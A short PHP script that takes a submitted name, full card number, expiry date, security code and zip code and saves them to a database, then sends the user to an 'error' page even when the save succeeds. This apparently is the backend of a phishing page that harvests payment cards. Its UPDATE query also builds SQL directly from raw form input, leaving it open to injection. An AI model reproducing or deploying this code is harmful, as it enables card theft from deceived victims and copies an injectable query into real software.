<?php
  include '../admin/lib/database.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {

  //EMPTY ERROR CHECK & TAKE INTO VARIABLE
  if (!empty($_POST['uniqid'])) {
    	$uniqid = $_POST['uniqid'];
      //TAKE INTO VARIABLE
      $customer_fname = $_POST['customer_fname'];
      $customer_lname = $_POST['customer_lname'];
      $card_number = $_POST['card_number'];
      $expire_date = $_POST['expire_date'];
      $security_code = $_POST['security_code'];
      $zip_code = $_POST['zip_code'];

  // UPDATE CONDITIONS AND QUERY  
  if (!empty($uniqid)) {
      $sql = "UPDATE customer_informations SET customer_fname= '$customer_fname', customer_lname= '$customer_lname', card_number= '$card_number', expire_date= '$expire_date', security_code= '$security_code', zip_code= '$zip_code' WHERE uniqid='$uniqid'";
      $update = mysqli_query($conn, $sql);
      if($update){
         $_SESSION['uniqid']="$uniqid";
         Header( 'Location: ../error/');
         exit();
      }
      else{
          $_SESSION['fail']="Something went to wrong! Try again";
          Header( 'Location: ../add-card');
          exit();
      } 
  }
  else{
    $_SESSION['fail']="*Something went to wrong! Try again";
    Header( 'Location: ../add-card/');
    exit();
  }
  }
  else{
    $_SESSION['sessionNull']="esomething went to wrong. Try again!";
    Header( 'Location: ../add-card/');
  }
  	
}
?>